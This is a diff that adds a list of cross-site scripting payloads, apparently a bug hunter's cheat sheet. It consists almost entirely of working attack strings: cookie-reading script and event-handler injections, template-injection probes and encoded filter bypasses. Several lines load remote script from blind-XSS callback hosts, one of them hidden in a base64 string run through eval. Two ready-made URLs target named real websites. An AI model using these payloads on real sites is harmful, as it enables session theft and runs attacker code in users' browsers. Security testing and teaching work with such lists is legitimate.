@@ -1,0 +1,92 @@
+XSS
+
+"><s>Aaaaa
+
+%22%3e%3cs%3eAaaaa
+
+{{ '7'*7 }}
+
+<script>alert(111)</script>
+
+</script><script>alert(1)</script>
+
+javascript:alert(document.cookie)//
+
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+"><img src=x onerror=prompt(2);> {{7*7}}
+
+<</svg>svg/onload=prompt`${document.cookie}`>
+
+
+"><script src=https://faisalshaikh.bxss.in></script>
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZmFpc2Fsc2hhaWtoLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&#61;&#61 onerror=eval(atob(this.id))>
+
+=========================================================
+
+https://www.shopify.com/markets?utm_source=INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+
+https://couponsmanager-uat.b2b.mars.com/jolokia/read%3Csvg%20onload=alert(document.cookie)%3E?mimeType=text/html
+
+<><img src=1 onerror=alert(3)>
+
+javascript:alert(%27KD%27)
+
+%22%3E%3Cbody%20onresize=alert(document.cookie)%3E%22
+
+"onmouseover="alert(4)
+
+javascript:alert(5)
+
+%22%3E%3Cbody%20onresize=alert(1)%3e
+
+${alert(6)}
+
+'-alert(7)-'
+
+"><h1/onmouseover='alert(/Xssposed/)'>R3NW4
+
+\');confirm(12);//
+
+<img src=x onerror=prompt(document.cookie) onerror=prompt(document.domain)
+onerror=prompt(document.domain)>
+
+<iframe/onload='this["src"]="javas
+cript:al"+"ert""';> <img/src=q onerror='new Function`al\\ert\\`8\"'>
+
+<meter onmouseover="alert(9)"
+
+'">><div><meter onmouseover="alert(10)"</div>"
+
+> <marquee loop=1 width=0 onfinish=alert(11)>
+> 
+
+{{7*'7'}}
+
+<%= 7 * 7 %>
+
+"><script src=https://faisalshaikhh.xss.ht></script>
+
+<img src="/" =_=" title="onerror='prompt(1)'">
+
+DOM
+
+//javascript:alert(1);
+//javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+
+
+Try this in reflected parameter
+
+"><iframe src="evilzone.org">
+
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+<a href="http://evil.com">click here</a>
